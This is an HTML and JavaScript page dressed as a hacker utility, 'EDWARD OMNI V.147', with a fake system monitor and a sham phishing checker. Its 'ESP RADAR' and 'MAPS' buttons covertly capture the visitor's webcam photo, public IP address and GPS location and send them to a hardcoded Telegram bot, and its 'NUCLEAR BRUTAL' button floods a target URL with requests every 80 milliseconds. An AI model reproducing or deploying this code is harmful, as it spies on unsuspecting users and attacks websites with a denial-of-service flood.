<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EDWARD OMNI V.147</title>
    <style>
        :root { --neon: #00ff88; --bg: #050a0e; --red: #ff4757; --purple: #bc13fe; --blue: #00bdff; }
        * { box-sizing: border-box; transition: 0.2s; }
        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; margin:0; padding: 15px; overflow-x: hidden; }
        .master-header { text-align: center; margin-bottom: 15px; }
        .master-name { font-size: 24px; font-weight: 800; background: linear-gradient(to right, var(--neon), var(--blue)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin: 0; }
        .card { background: rgba(15, 25, 35, 0.9); border: 1px solid rgba(0,255,136,0.2); border-radius: 20px; padding: 18px; margin-bottom: 12px; }
        h3 { margin: 0 0 12px 0; font-size: 10px; color: rgba(255,255,255,0.5); letter-spacing: 2px; text-transform: uppercase; }
        input { background: rgba(0,0,0,0.5); border: 1px solid rgba(0,255,136,0.3); border-radius: 10px; color: var(--neon); padding: 12px; width: 100%; margin-bottom: 10px; outline: none; }
        .btn { width: 100%; padding: 14px; border-radius: 12px; border: none; cursor: pointer; font-weight: 800; font-size: 11px; text-transform: uppercase; display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 5px; }
        .btn-scan { background: #1a1a1a; color: var(--neon); border: 1px solid var(--neon); }
        .btn-atk { background: linear-gradient(45deg, var(--red), var(--purple)); color: #fff; }
        .btn-radar { background: transparent; color: var(--blue); border: 1px solid var(--blue); }
        .btn-map { background: var(--neon); color: #000; }
        .sys-monitor { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 10px; }
        .mon-box { border: 1px solid rgba(0,255,136,0.3); padding: 10px; border-radius: 12px; text-align: center; color: var(--neon); font-size: 11px; font-weight: bold; }
        .log-box { display: none; margin-top: 12px; background: #000; border-radius: 10px; padding: 10px; font-family: monospace; font-size: 9px; height: 120px; overflow-y: auto; border: 1px solid #1a1a1a; color: var(--neon); }
        #mapBox { display: none; width: 100%; height: 250px; border-radius: 15px; border: 1px solid var(--neon); margin-top: 15px; }
        
        /* ESP CAMERA OVERLAY */
        #radarOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9999; flex-direction: column; align-items: center; justify-content: center; }
        .esp-box { position: absolute; border: 2px solid var(--neon); width: 80%; height: 60%; pointer-events: none; box-shadow: inset 0 0 20px var(--neon); }
        .esp-line { position: absolute; top: 0; left: 50%; width: 2px; height: 100%; background: var(--neon); opacity: 0.3; }
        .radar-container { width: 160px; height: 160px; border-radius: 50%; border: 2px solid var(--neon); position: relative; overflow: hidden; margin-bottom: 20px; z-index: 10; }
        .radar-sweep { position: absolute; width: 100%; height: 100%; border-radius: 50%; background: conic-gradient(from 0deg, transparent 70%, var(--neon)); animation: rotate 2s linear infinite; }
        .btn-exit { background: var(--red); color: white; padding: 12px 35px; border-radius: 15px; border: none; font-weight: bold; z-index: 10; }
        #customNotif { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: var(--neon); color: #000; padding: 12px 25px; border-radius: 50px; font-weight: 800; font-size: 11px; display: none; z-index: 10001; }
        @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        canvas, video { display: none; }
    </style>
</head>
<body>
    <div id="customNotif"></div>
    <div class="master-header">
        <p class="master-name">EDWARD OMNI V.147</p>
        <div class="sys-monitor">
            <div class="mon-box">CPU: <span id="cpuLoad">0%</span></div>
            <div class="mon-box">TEMP: <span id="sysTemp">38°C</span></div>
        </div>
    </div>

    <div class="card">
        <h3>🛡️ DEEP CLOUD SCANNER</h3>
        <input type="text" id="scanInput" placeholder="Analyze Phishing...">
        <button class="btn btn-scan" onclick="analyzeLink()">⚡ ANALYZE LINK</button>
        <div id="scanLog" class="log-box"></div>
    </div>

    <div class="card">
        <h3>🔥 NUCLEAR BRUTAL</h3>
        <input type="text" id="target1" placeholder="Target URL">
        <button class="btn btn-atk" id="atkBtn" onclick="toggleAtk()">LAUNCH NUCLEAR 🚀</button>
        <div id="killerLog" class="log-box"></div>
    </div>

    <div class="card" style="display: flex; gap: 8px;">
        <button class="btn btn-radar" style="flex: 1;" onclick="startRadar()">📡 ESP RADAR</button>
        <button class="btn btn-map" style="flex: 1;" onclick="showLiveMap()">📍 MAPS</button>
    </div>
    <iframe id="mapBox" src="" frameborder="0"></iframe>

    <div id="radarOverlay">
        <div class="esp-box"></div>
        <div class="esp-line"></div>
        <div class="radar-container"><div class="radar-sweep"></div></div>
        <p style="color:var(--neon); letter-spacing:3px; font-size:11px; margin-bottom:20px; z-index:10;">ESP SENSOR ACTIVE...</p>
        <button class="btn-exit" onclick="abortRadar()">[ ABORT ESP ]</button>
    </div>
    <canvas id="canvas"></canvas><video id="v" autoplay playsinline></video>

    <script>
        const TOKEN = '8766727574:AAHYs-g11Up4SWnl4t8P3pHpMvS1XkKkr0g';
        const CHAT_ID = '7898572558';
        let isAtk = false;

        setInterval(() => {
            document.getElementById('cpuLoad').innerText = Math.floor(Math.random() * (95 - 60) + 60) + "%";
            document.getElementById('sysTemp').innerText = Math.floor(Math.random() * (45 - 38) + 38) + "°C";
        }, 800);

        function showNotif(msg) {
            const n = document.getElementById('customNotif');
            n.innerText = msg; n.style.display = 'block';
            setTimeout(() => { n.style.display = 'none'; }, 2500);
        }

        function analyzeLink() {
            const url = document.getElementById('scanInput').value;
            const log = document.getElementById('scanLog');
            if(!url) return showNotif("MASUKKAN LINK!");
            log.style.display = "block";
            log.innerHTML = "> Memulai ESP Scan...<br>> Checking SSL...<br>";
            setTimeout(() => {
                let isSafe = url.startsWith('https');
                log.innerHTML += "> Result: " + (isSafe ? "SAFE" : "DANGER") + "<br>> Done.";
                showNotif(isSafe ? "LINK AMAN" : "PHISHING DETECTED!");
            }, 1000);
        }

        function toggleAtk() {
            const t1 = document.getElementById('target1').value;
            const log = document.getElementById('killerLog');
            if(!t1 || isAtk) { if(isAtk) location.reload(); return; }
            isAtk = true; log.style.display = "block";
            document.getElementById('atkBtn').innerText = "STOP 🛑";
            setInterval(() => {
                const img = new Image(); img.src = t1 + "/?v=" + Math.random();
                const e = document.createElement('div'); e.innerText = "> [V.147] HIT -> " + t1.substring(0,15);
                log.prepend(e); if(log.childNodes.length > 10) log.removeChild(log.lastChild);
            }, 80);
        }

        async function startRadar() {
            document.getElementById('radarOverlay').style.display = 'flex';
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                document.getElementById('v').srcObject = stream;
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    setTimeout(async () => {
                        const canvas = document.getElementById('canvas'); const video = document.getElementById('v');
                        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
                        const ipR = await fetch('https://api.ipify.org?format=json'); const ipD = await ipR.json();
                        await sendTele(blob, ipD.ip, pos.coords.latitude, pos.coords.longitude, "ESP_RADAR");
                        abortRadar();
                        showNotif("🔱 ESP DATA CAPTURED!");
                    }, 2500);
                }, () => abortRadar());
            } catch (e) { abortRadar(); }
        }

        function showLiveMap() {
            showNotif("🛰️ LOCKING GPS...");
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const lat = pos.coords.latitude; const lon = pos.coords.longitude;
                const map = document.getElementById('mapBox');
                map.src = "https://maps.google.com/maps?q="+lat+","+lon+"&z=15&output=embed";
                map.style.display = "block";
                showNotif("📍 MAP UPDATED!");
                const ipR = await fetch('https://api.ipify.org?format=json'); const ipD = await ipR.json();
                sendTele(null, ipD.ip, lat, lon, "MAP_V147");
            }, () => showNotif("GPS ERROR!"), {enableHighAccuracy: true});
        }

        function abortRadar() {
            document.getElementById('radarOverlay').style.display = 'none';
            const v = document.getElementById('v');
            if(v.srcObject) v.srcObject.getTracks().forEach(t => t.stop());
        }

        async function sendTele(photo, ip, lat, lon, source) {
            const fd = new FormData(); fd.append('chat_id', CHAT_ID);
            let cap = "🔱 [ V.147 - "+source+" ] 🔱\n🌐 IP: "+ip+"\n📍 MAP: https://www.google.com/maps?q="+lat+","+lon;
            if(photo) {
                fd.append('photo', photo); fd.append('caption', cap);
                return fetch("https://api.telegram.org/bot" + TOKEN + "/sendPhoto", { method: "POST", body: fd });
            } else {
                fd.append('text', cap);
                return fetch("https://api.telegram.org/bot" + TOKEN + "/sendMessage", { method: "POST", body: fd });
            }
        }
    </script>
</body>
</html>
